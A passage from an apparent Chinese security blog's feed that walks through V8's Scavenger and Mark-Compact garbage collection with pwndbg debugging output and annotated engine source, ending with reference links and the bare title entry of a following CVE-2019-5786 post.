gc_reason,</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">const</span> v8::GCCallbackFlags gc_callback_flags)</span> </span></span><br></pre></td></tr></table></figure><p>下断点进行调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">b v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)</span><br><span class="line"></span><br><span class="line"># 可以打印出参数信息以及函数调用栈，可以发现gc_reason为kAllocationFailure，当我们申请太多对象时如果空闲空间不够了则需要对堆空间进行垃圾回收</span><br><span class="line">pwndbg&gt; print space</span><br><span class="line">$1 = v8::internal::NEW_SPACE</span><br><span class="line">pwndbg&gt; print gc_reason</span><br><span class="line">$2 = v8::internal::GarbageCollectionReason::kAllocationFailure</span><br><span class="line">pwndbg&gt; print gc_callback_flags</span><br><span class="line">$3 = v8::kNoGCCallbackFlags</span><br><span class="line">pwndbg&gt; k</span><br><span class="line">#0  v8::internal::Heap::CollectGarbage (this=0x27d000009ee0, space=v8::internal::NEW_SPACE, gc_reason=v8::internal::GarbageCollectionReason::kAllocationFailure, gc_callback_flags=v8::kNoGCCallbackFlags) at ../../src/heap/heap.cc:1527</span><br><span class="line">#1  0x00007fc24d083295 in v8::internal::Heap::AllocateRawWithLightRetrySlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5090</span><br><span class="line">#2  0x00007fc24d0833eb in v8::internal::Heap::AllocateRawWithRetryOrFailSlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5106</span><br><span class="line">#3  0x00007fc24d03be1b in v8::internal::Heap::AllocateRawWith&lt;(v8::internal::Heap::AllocationRetryMode)1&gt; (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap-inl.h:310</span><br><span class="line">#4  0x00007fc24d0234c5 in v8::internal::Factory::NewFillerObject (this=0x27d000000000, size=16, double_align=false, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode) at ../../src/heap/factory.cc:299</span><br><span class="line">#5  0x00007fc24d851183 in v8::internal::__RT_impl_Runtime_AllocateInYoungGeneration (args=..., isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:393</span><br><span class="line">#6  0x00007fc24d850aa0 in v8::internal::Runtime_AllocateInYoungGeneration (args_length=2, args_object=0x7ffe42bb58d0, isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:373</span><br><span class="line">#7  0x00007fc24c62937f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">#8  0x00007fc24c7482b1 in Builtins_StringConstructor () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">#9  0x00007fc24c365461 in Builtins_JSBuiltinsConstructStub () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> ► 1534   DevToolsTraceEventScope devtools_trace_event_scope(</span><br><span class="line">   1535       this, IsYoungGenerationCollector(collector) ? &quot;MinorGC&quot; : &quot;MajorGC&quot;,</span><br><span class="line">   1536       GarbageCollectionReasonToString(gc_reason));</span><br><span class="line">pwndbg&gt; print IsYoungGenerationCollector(collector)</span><br><span class="line">$5 = true</span><br><span class="line">pwndbg&gt; print collector</span><br><span class="line">$6 = v8::internal::SCAVENGER</span><br><span class="line"># 这里可以验证使用的GC方式为MinorGC</span><br><span class="line"># 之后调用了v8::internal::Heap::PerformGarbageCollection函数来执行垃圾收集的工作，在该函数中依次调用了  tracer()-&gt;StartInSafepoint();GarbageCollectionPrologueInSafepoint(); EnsureFromSpaceIsCommitted();等函数做一些前置准备，之后进行判断</span><br><span class="line">  switch (collector) &#123;</span><br><span class="line">    case MARK_COMPACTOR:</span><br><span class="line">      MarkCompact();</span><br><span class="line">      break;</span><br><span class="line">    case MINOR_MARK_COMPACTOR:</span><br><span class="line">      MinorMarkCompact();</span><br><span class="line">      break;</span><br><span class="line">    case SCAVENGER:</span><br><span class="line">      Scavenge();</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line"># 很明显这次进入了Scavenge()执行。</span><br><span class="line">void Heap::Scavenge() &#123;</span><br><span class="line">  ...</span><br><span class="line">  // Implements Cheney&#x27;s copying algorithm</span><br><span class="line">  LOG(isolate_, ResourceEvent(&quot;scavenge&quot;, &quot;begin&quot;));</span><br><span class="line"></span><br><span class="line">  scavenger_collector_-&gt;CollectGarbage();</span><br><span class="line"></span><br><span class="line">  LOG(isolate_, ResourceEvent(&quot;scavenge&quot;, &quot;end&quot;));</span><br><span class="line"></span><br><span class="line">  SetGCState(NOT_IN_GC);</span><br><span class="line">&#125;</span><br><span class="line"># 观察上面的代码，前面的东西我们不关心，他做了一些准备工作，到后面的时候执行了scavenger_collector_-&gt;CollectGarbage(); 跟进进入到heap\scavenger.cc文件中（注释中告诉我们使用了Cheney&#x27;s copying algorithm）</span><br><span class="line"># 跟进入ScavengerCollector::CollectGarbage()函数，发现每个过程都用块级作用域区分出来了，并标注了注释，这样方便理解了不少</span><br></pre></td></tr></table></figure><h4 id="Scavenger垃圾回收"><a href="#Scavenger垃圾回收" class="headerlink" title="Scavenger垃圾回收"></a>Scavenger垃圾回收</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先建立一个全局的概念，v8官方博客已经描述了使用的相关技术，核心就是更好的利用了多线程，并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。</span></span><br><span class="line"><span class="comment">// 前面有清除堆的操作，不太懂这里的目的是什么</span></span><br><span class="line"><span class="comment">// 1、Try to finish sweeping here, such that the following code doesn&#x27;t need to pause &amp; resume sweeping.</span></span><br><span class="line"><span class="comment">// 2、Pause the concurrent sweeper.</span></span><br><span class="line"><span class="comment">// 3、Identify weak unmodified handles. Requires an unmodified graph.</span></span><br><span class="line"><span class="comment">// 之后对根进行了复制，主要就是两个函数IterateRoots以及IterateYoungStrongAndDependentRoots</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Copy roots.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_ROOTS);</span><br><span class="line">    <span class="comment">// Scavenger treats all weak roots except for global handles as strong.</span></span><br><span class="line">    <span class="comment">// That is why we don&#x27;t set skip_weak = true here and instead visit</span></span><br><span class="line">    <span class="comment">// global handles separately.</span></span><br><span class="line">    <span class="function">base::EnumSet&lt;SkipRoot&gt; <span class="title">options</span><span class="params">(&#123;SkipRoot::kExternalStringTable,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     SkipRoot::kGlobalHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     SkipRoot::kOldGeneration&#125;)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">V8_UNLIKELY</span>(FLAG_scavenge_separate_stack_scanning)) &#123;</span><br><span class="line">        options.<span class="built_in">Add</span>(SkipRoot::kStack);</span><br><span class="line">    &#125;</span><br><span class="line">    heap_-&gt;<span class="built_in">IterateRoots</span>(&amp;root_scavenge_visitor, options);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungStrongAndDependentRoots</span>(</span><br><span class="line">        &amp;root_scavenge_visitor);</span><br><span class="line">    scavengers[kMainThreadId]-&gt;<span class="built_in">Flush</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后并行移动全部的对象，多线程std::move(memory_chunks)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">    V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">        -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                  std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                            std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                            &amp;copied_list, &amp;promotion_list))</span><br><span class="line">        -&gt;<span class="built_in">Join</span>();</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">      <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">      V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">          -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                    std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                              std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                              &amp;copied_list, &amp;promotion_list))</span><br><span class="line">          -&gt;<span class="built_in">Join</span>();</span><br><span class="line">      <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">      <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">    V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">        -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                  std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                            std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                            &amp;copied_list, &amp;promotion_list))</span><br><span class="line">        -&gt;<span class="built_in">Join</span>();</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">V8_UNLIKELY</span>(FLAG_scavenge_separate_stack_scanning)) &#123;</span><br><span class="line">    <span class="built_in">IterateStackAndScavenge</span>(&amp;root_scavenge_visitor, &amp;scavengers,</span><br><span class="line">                            kMainThreadId);</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Scavenge weak global handles.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(),</span><br><span class="line">             GCTracer::Scope::SCAVENGER_SCAVENGE_WEAK_GLOBAL_HANDLES_PROCESS);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">MarkYoungWeakDeadObjectsPending</span>(</span><br><span class="line">        &amp;IsUnscavengedHeapObjectSlot);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungWeakDeadObjectsForFinalizers</span>(</span><br><span class="line">        &amp;root_scavenge_visitor);</span><br><span class="line">    scavengers[kMainThreadId]-&gt;<span class="built_in">Process</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungWeakObjectsForPhantomHandles</span>(</span><br><span class="line">        &amp;root_scavenge_visitor, &amp;IsUnscavengedHeapObjectSlot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Finalize parallel scavenging.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_FINALIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DCHECK</span>(surviving_new_large_objects_.<span class="built_in">empty</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; scavenger : scavengers) &#123;</span><br><span class="line">        scavenger-&gt;<span class="built_in">Finalize</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    scavengers.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">HandleSurvivingNewLargeObjects</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MARK-COMPACTOR垃圾回收"><a href="#MARK-COMPACTOR垃圾回收" class="headerlink" title="MARK_COMPACTOR垃圾回收"></a>MARK_COMPACTOR垃圾回收</h4><p>在上面的调试过程达到了case的步骤</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (collector) &#123;</span><br><span class="line">    <span class="keyword">case</span> MARK_COMPACTOR:</span><br><span class="line">        <span class="built_in">MarkCompact</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> MINOR_MARK_COMPACTOR:</span><br><span class="line">        <span class="built_in">MinorMarkCompact</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SCAVENGER:</span><br><span class="line">        <span class="built_in">Scavenge</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们要分析Major GC，所以自然进入 MarkCompact函数执行</p><p>编写如下代码触发该case</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80000000</span>);</span><br></pre></td></tr></table></figure><p>此时触发了MajorGC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print collector</span><br><span class="line">$1 = v8::internal::MARK_COMPACTOR</span><br></pre></td></tr></table></figure><p>还是先看下整体的流程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逻辑比较清晰， mark_compact_collector()-&gt;Prepare()进行增量标记环境的创建，MarkCompactPrologue函数清理各个位置的缓存。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Heap::MarkCompact</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">PauseAllocationObserversScope <span class="title">pause_observers</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SetGCState</span>(MARK_COMPACT);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">LOG</span>(isolate_, <span class="built_in">ResourceEvent</span>(<span class="string">&quot;markcompact&quot;</span>, <span class="string">&quot;begin&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="function">CodeSpaceMemoryModificationScope <span class="title">code_modifcation</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">UpdateOldGenerationAllocationCounter</span>();</span><br><span class="line">  <span class="keyword">uint64_t</span> size_of_objects_before_gc = <span class="built_in">SizeOfObjects</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mark_compact_collector</span>()-&gt;<span class="built_in">Prepare</span>();</span><br><span class="line"></span><br><span class="line">  ms_count_++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkCompactPrologue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mark_compact_collector</span>()-&gt;<span class="built_in">CollectGarbage</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">LOG</span>(isolate_, <span class="built_in">ResourceEvent</span>(<span class="string">&quot;markcompact&quot;</span>, <span class="string">&quot;end&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkCompactEpilogue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_allocation_site_pretenuring) &#123;</span><br><span class="line">    <span class="built_in">EvaluateOldSpaceLocalPretenuring</span>(size_of_objects_before_gc);</span><br><span class="line">  &#125;</span><br><span class="line">  old_generation_size_configured_ = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// This should be updated before PostGarbageCollectionProcessing, which</span></span><br><span class="line">  <span class="comment">// can cause another GC. Take into account the objects promoted during</span></span><br><span class="line">  <span class="comment">// GC.</span></span><br><span class="line">  old_generation_allocation_counter_at_last_gc_ +=</span><br><span class="line">      <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(promoted_objects_size_);</span><br><span class="line">  old_generation_size_at_last_gc_ = <span class="built_in">OldGenerationSizeOfObjects</span>();</span><br><span class="line">  global_memory_at_last_gc_ = <span class="built_in">GlobalSizeOfObjects</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心的标记压缩步骤，这里由于采用了增量垃圾回收，所以采用了三色标记法，使用了迪杰斯特拉的写入屏障。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MarkCompactCollector::CollectGarbage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Make sure that Prepare() has been called. The individual steps below will</span></span><br><span class="line">  <span class="comment">// update the state as they proceed.</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(state_ == PREPARE_GC);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ENABLE_MINOR_MC</span></span><br><span class="line">  <span class="built_in">heap</span>()-&gt;<span class="built_in">minor_mark_compact_collector</span>()-&gt;<span class="built_in">CleanupSweepToIteratePages</span>();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// ENABLE_MINOR_MC</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkLiveObjects</span>();<span class="comment">// 这里采用了并发标记与增量标记</span></span><br><span class="line">  <span class="built_in">ClearNonLiveReferences</span>(); <span class="comment">// Clear non-live references in weak cells, transition and descriptor arrays, and deoptimize dependent code of non-live maps.</span></span><br><span class="line">  <span class="built_in">VerifyMarking</span>();<span class="comment">// 验证了活动对象是否被涂黑。跟踪调试发现变量FLAG_verify_heap为false，所以并没有验证。猜测可能特殊情况才需要对标记进行验证保证安全，否则为了效率考虑一般不会多加一个验证的步骤，属实没有必要。</span></span><br><span class="line">  <span class="built_in">heap</span>()-&gt;<span class="built_in">memory_measurement</span>()-&gt;<span class="built_in">FinishProcessing</span>(native_context_stats_);</span><br><span class="line">  <span class="built_in">RecordObjectStats</span>();<span class="comment">// 这里判断对象的状态是否被记录，如果没有则将其记录，调试时发现此时无需记录，函数直接返回。</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">StartSweepSpaces</span>();<span class="comment">// 通过在主线程上贡献并设置其他页面进行扫描来开始扫描空间。 不启动清扫任务。设置的扫描空间为old_space、code_space、map_space。之后执行StartSweeping。StartSweeping函数内部会对对象按照大小进行排序。排序是为了使压缩更有效：通过首先清除具有最多空闲字节的页面，我们更有可能在撤出页面时，已经清除的页面将有足够的空闲字节来容纳要移动的对象（并且 因此，我们不需要等待更多页面被扫描来移动这些对象）。 由于地图不会移动，因此在扫描它们之前无需对 MAP_SPACE 中的页面进行排序。</span></span><br><span class="line">  <span class="built_in">Evacuate</span>();<span class="comment">// 清除阶段的操作。重要函数执行顺序如下：EvacuatePrologue、EvacuatePagesInParallel、UpdatePointersAfterEvacuation、FreeQueuedChunks、EvacuateEpilogue。对new_space和old_space的对象进行压缩最后更新指针。看起来仍是通过GC标记-压缩方式来进行实现的。并未读懂启发式压缩的过程。</span></span><br><span class="line">  <span class="built_in">Finish</span>();<span class="comment">// 调用SweepArrayBufferExtensions，确保young空间和old空间为null。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就算了解了相关的算法知识以及有较为丰富的注释，但观察源代码理解这个庞大的GC过程仍然比较痛苦，尤其是和并发与并行沾上边，而且需要对某些位置进行mutex限制访问，目前对于源代码的分析就简单于此，笔者需要补充自己的实力与经验再去挑战一下v8的GC实现了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>《垃圾回收的算法与实现》                                                                                            // [日]中村成洋    相川光</p><p><a class="link"   href="https://www.cnblogs.com/qqmomery/category/719315.html" >https://www.cnblogs.com/qqmomery/category/719315.html<i class="fas fa-external-link-alt"></i></a>                                    // GC总结</p><p><a class="link"   href="https://www.jianshu.com/p/12544c0ad5c1" >https://www.jianshu.com/p/12544c0ad5c1<i class="fas fa-external-link-alt"></i></a>                                                                // 三色标记法详解</p><p><a class="link"   href="https://juejin.cn/post/6896363424398180359" >https://juejin.cn/post/6896363424398180359<i class="fas fa-external-link-alt"></i></a>                                                        // GC总结</p><p><a class="link"   href="https://juejin.cn/post/6844904161654341646" >https://juejin.cn/post/6844904161654341646<i class="fas fa-external-link-alt"></i></a>                                                        //    v8相关总结</p><p><a class="link"   href="https://time.geekbang.org/column/intro/296?tab=catalog" >https://time.geekbang.org/column/intro/296?tab=catalog<i class="fas fa-external-link-alt"></i></a>                                        // 图解google v8</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;垃圾回收的算法与实现&quot;&gt;&lt;a href=&quot;#垃圾回收的算法与实现&quot; class=&quot;headerlink&quot; title=&quot;垃圾回收的算法与实现&quot;&gt;&lt;/a&gt;垃圾回收的算法与实现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="技术研究" scheme="https://fa1lr4in.github.io/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="基础技术" scheme="https://fa1lr4in.github.io/tags/%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="https://fa1lr4in.github.io/2021/05/31/CVE-2019-5786/"/>
    <id>https://fa1lr4in.github.io/2021/05/31/CVE-2019-5786/</id>
    <published>2021-05-31T09:35:20.000Z</published>
    <updated>2022-04-19T09:11:04.496Z</updated>
    
